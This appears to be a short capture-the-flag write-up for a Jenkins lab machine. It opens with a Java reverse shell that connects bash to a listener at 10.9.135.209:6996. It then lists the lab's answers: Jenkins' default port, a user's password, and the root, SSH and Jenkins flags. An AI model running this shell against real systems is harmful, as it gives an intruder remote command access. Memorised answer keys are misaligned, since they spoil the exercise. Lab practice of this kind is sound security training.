January 05, 2023

-------------------------------

```
String host="10.9.135.209";
int port=6996;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

1. What is the default port for Jenkins?
	- 8080

2. What is the password of the user tracy?
	- 13_1n_33

3. What's the root flag?
	- ezRo0tW1thoutDiD

4. What is the error message when you login as tracy again and try sudo -l after its removal from the sudoers group?
	- Sorry, user tracy may not run sudo on jenkins.

5. What's the SSH flag?
	- Ne3d2SecureTh1sSecureSh31l

6. What's the Jenkins flag?
	- FullTrust_has_n0_Place1nS3cur1ty
